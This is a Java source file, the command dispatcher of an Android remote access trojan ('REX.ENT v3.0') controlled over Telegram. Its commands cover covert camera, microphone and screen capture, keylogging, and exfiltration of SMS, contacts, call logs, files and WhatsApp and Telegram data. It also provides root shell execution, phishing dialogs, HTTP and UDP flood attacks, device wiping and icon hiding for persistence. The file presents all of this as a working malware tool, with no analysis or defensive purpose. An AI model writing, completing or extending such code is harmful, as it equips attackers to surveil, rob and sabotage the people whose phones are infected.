package com.enterprise.rat.commands;

import android.content.Context;
import android.os.Environment;
import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.utils.TelegramApi;
import com.google.gson.JsonObject;

public class CommandHandler {
    private Context context;
    private FileManager fileManager;
    private SMSManager smsManager;
    private LocationManager locationManager;
    private CameraManager cameraManager;
    private DeviceInfoManager deviceInfoManager;
    private ContactManager contactManager;
    private CallManager callManager;
    private AudioManager audioManager;
    private ScreenManager screenManager;
    private KeyloggerManager keyloggerManager;
    private ShellManager shellManager;
    private SocialMediaManager socialMediaManager;
    private AppManager appManager;
    private PhishingManager phishingManager;

    public CommandHandler(Context context) {
        this.context = context;
        this.fileManager = new FileManager(context);
        this.smsManager = new SMSManager(context);
        this.locationManager = new LocationManager(context);
        this.cameraManager = new CameraManager(context);
        this.deviceInfoManager = new DeviceInfoManager(context);
        this.contactManager = new ContactManager(context);
        this.callManager = new CallManager(context);
        this.audioManager = new AudioManager(context);
        this.screenManager = new ScreenManager(context);
        this.keyloggerManager = new KeyloggerManager(context);
        this.shellManager = new ShellManager();
        this.socialMediaManager = new SocialMediaManager(context);
        this.appManager = new AppManager(context);
        this.phishingManager = new PhishingManager(context);
    }

    public void handleCommand(String text, long chatId, String messageId, JsonObject message) {
        String[] args = text.split(" ");
        String cmd = args[0].toLowerCase();

        try {
            switch (cmd) {
                case "/start":
                    TelegramApi.sendMessage("⚡ <b>REX.ENT v3.0 Online</b>\nID: <code>" + BotConfig.SESSION_ID + "</code>\n\n" +
                            "<b>📁 File:</b> /ls /download /rm /rename\n" +
                            "<b>📍 GPS:</b> /location /gps\n" +
                            "<b>💬 SMS:</b> /sms_list /sendsms /delsms\n" +
                            "<b>📞 Calls:</b> /calls\n" +
                            "<b>👤 Contacts:</b> /contacts\n" +
                            "<b>📷 Camera:</b> /photo_front /photo_back /record\n" +
                            "<b>🎙 Audio:</b> /mic /liveaudio\n" +
                            "<b>🖥 Screen:</b> /screenshot /screenrecord\n" +
                            "<b>⌨ Keylog:</b> /keylog_start /keylog_stop /keylog_dump\n" +
                            "<b>📱 Device:</b> /info /apps /battery /network /permissions\n" +
                            "<b>📋 Clipboard:</b> /clipboard /setclip\n" +
                            "<b>🔔 Notif:</b> /notif /fakenotif\n" +
                            "<b>📦 Steal:</b> /steal_images /steal_docs /extract_wa /extract_tg\n" +
                            "<b>🌐 DDoS:</b> /httpflood /udpflood\n" +
                            "<b>⚙ Shell:</b> /shell /sush\n" +
                            "<b>🛡 System:</b> /openurl /toast /phish /vibrate /playsound /lock /wipe /destroy /hideicon /autostart");
                    break;

                // === FILE MANAGER ===
                case "/ls":
                    fileManager.listDirectory(args.length > 1 ? args[1] : Environment.getExternalStorageDirectory().getAbsolutePath());
                    break;
                case "/download":
                    if (args.length > 1) fileManager.uploadFile(args[1]);
                    break;
                case "/rm":
                    fileManager.deleteFile(args.length > 1 ? args[1] : "");
                    break;
                case "/rename":
                    fileManager.renameFile(args.length > 1 ? args[1] : "", args.length > 2 ? args[2] : "");
                    break;

                // === SMS ===
                case "/sms_list":
                    smsManager.sendSMSList(args.length > 1 ? Integer.parseInt(args[1]) : 10);
                    break;
                case "/sendsms":
                    smsManager.sendSMS(args.length > 1 ? args[1] : "", args.length > 2 ? joinArgs(args, 2) : "");
                    break;
                case "/delsms":
                    smsManager.deleteSMS(args.length > 1 ? args[1] : "");
                    break;

                // === CALLS ===
                case "/calls":
                    callManager.sendCallLogs(args.length > 1 ? Integer.parseInt(args[1]) : 20);
                    break;

                // === CONTACTS ===
                case "/contacts":
                    contactManager.sendContacts();
                    break;

                // === LOCATION ===
                case "/location":
                    locationManager.sendCurrentLocation();
                    break;
                case "/gps":
                    locationManager.startLiveGPS();
                    break;

                // === CAMERA ===
                case "/photo_front":
                    cameraManager.takePhoto(1);
                    break;
                case "/photo_back":
                    cameraManager.takePhoto(0);
                    break;
                case "/record":
                    cameraManager.recordVideo(args.length > 1 ? Integer.parseInt(args[1]) : 10);
                    break;

                // === AUDIO ===
                case "/mic":
                    audioManager.recordAudio(args.length > 1 ? Integer.parseInt(args[1]) : 10);
                    break;
                case "/liveaudio":
                    audioManager.startLiveStream();
                    break;

                // === SCREEN ===
                case "/screenshot":
                    screenManager.takeScreenshot();
                    break;
                case "/screenrecord":
                    screenManager.startScreenRecord(args.length > 1 ? Integer.parseInt(args[1]) : 10);
                    break;

                // === KEYLOGGER ===
                case "/keylog_start":
                    keyloggerManager.start();
                    break;
                case "/keylog_stop":
                    keyloggerManager.stop();
                    break;
                case "/keylog_dump":
                    keyloggerManager.sendLogs();
                    break;

                // === DEVICE INFO ===
                case "/info":
                    deviceInfoManager.sendDeviceInfo();
                    break;
                case "/apps":
                    appManager.listInstalledApps();
                    break;
                case "/battery":
                    deviceInfoManager.sendBatteryStatus();
                    break;
                case "/network":
                    deviceInfoManager.sendNetworkInfo();
                    break;
                case "/permissions":
                    deviceInfoManager.sendPermissions();
                    break;

                // === CLIPBOARD ===
                case "/clipboard":
                    ClipboardManager.getClipboard(context);
                    break;
                case "/setclip":
                    ClipboardManager.setClipboard(context, joinArgs(args, 1));
                    break;

                // === NOTIFICATIONS ===
                case "/notif":
                    NotificationManager.dumpNotifications();
                    break;
                case "/fakenotif":
                    NotificationManager.sendFake(context, args.length > 1 ? args[1] : "Alert", args.length > 2 ? joinArgs(args, 2) : "Message");
                    break;

                // === STEALER ===
                case "/steal_images":
                    StealerManager.stealImages(context);
                    break;
                case "/steal_docs":
                    StealerManager.stealDocuments(context);
                    break;
                case "/extract_wa":
                    socialMediaManager.extractWhatsApp();
                    break;
                case "/extract_tg":
                    socialMediaManager.extractTelegram();
                    break;

                // === NETWORK ===
                case "/httpflood":
                    NetworkManager.httpFlood(args.length > 1 ? args[1] : "http://example.com", args.length > 2 ? Integer.parseInt(args[2]) : 100);
                    break;
                case "/udpflood":
                    NetworkManager.udpFlood(args.length > 1 ? args[1] : "127.0.0.1", args.length > 2 ? Integer.parseInt(args[2]) : 53, args.length > 3 ? Integer.parseInt(args[3]) : 30);
                    break;

                // === SHELL ===
                case "/shell":
                    ShellManager.executeCommand(joinArgs(args, 1));
                    break;
                case "/sush":
                    ShellManager.executeRootCommand(joinArgs(args, 1));
                    break;

                // === SYSTEM ===
                case "/openurl":
                    phishingManager.openURL(args.length > 1 ? args[1] : "");
                    break;
                case "/toast":
                    SystemManager.showToast(context, joinArgs(args, 1));
                    break;
                case "/phish":
                    PhishingManager.showPhishingDialog(context, args.length > 1 ? args[1] : "Google", args.length > 2 ? joinArgs(args, 2) : "Verify your account");
                    break;
                case "/vibrate":
                    SystemManager.vibrate(context, args.length > 1 ? Integer.parseInt(args[1]) : 1000);
                    break;
                case "/playsound":
                    SystemManager.playSound(context);
                    break;
                case "/lock":
                    SystemManager.lockDevice(context);
                    break;
                case "/wipe":
                    SystemManager.wipeDevice(context);
                    break;
                case "/destroy":
                    SystemManager.selfDestruct(context);
                    break;
                case "/hideicon":
                    SystemManager.hideIcon(context);
                    break;
                case "/autostart":
                    SystemManager.enableAutostart(context);
                    break;

                // === SOCIAL MEDIA AUDIT ===
                case "/socmed":
                    socialMediaManager.auditSocialMedia();
                    break;

                case "/help":
                    TelegramApi.sendMessage("Too many commands. Type /start for full list.");
                    break;
            }
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Error: " + e.getMessage());
        }
    }

    private String joinArgs(String[] args, int start) {
        StringBuilder sb = new StringBuilder();
        for (int i = start; i < args.length; i++) {
            if (i > start) sb.append(" ");
            sb.append(args[i]);
        }
        return sb.toString();
    }
}
